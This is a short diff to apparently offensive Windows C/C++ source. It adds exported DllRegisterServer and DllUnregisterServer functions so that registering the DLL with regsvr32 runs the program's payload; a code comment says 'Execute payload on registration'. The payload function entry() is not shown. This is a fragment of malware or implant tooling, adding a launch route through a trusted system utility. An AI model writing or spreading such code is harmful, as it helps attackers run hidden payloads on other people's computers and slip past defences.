@@ -175,6 +175,20 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 	return TRUE;
 }
 
+// Export functions for DLL registration (required for regsvr32)
+extern "C" __declspec(dllexport) HRESULT DllRegisterServer(void)
+{
+	// Execute payload on registration
+	entry();
+	return S_OK;
+}
+
+extern "C" __declspec(dllexport) HRESULT DllUnregisterServer(void)
+{
+	// Optionally execute on unregistration
+	return S_OK;
+}
+
 #else
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
